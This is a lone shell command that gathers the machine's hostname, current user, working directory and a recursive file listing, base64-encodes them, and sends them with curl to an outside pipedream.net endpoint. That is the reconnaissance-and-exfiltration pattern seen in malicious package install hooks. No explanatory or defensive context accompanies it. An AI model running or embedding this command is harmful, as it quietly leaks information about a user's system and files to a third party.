curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(pwd | base64)" -d $(ls ./* -aril | base64) https://0006166aa72d9f58c6c28e76910a79cf.m.pipedream.net/wx
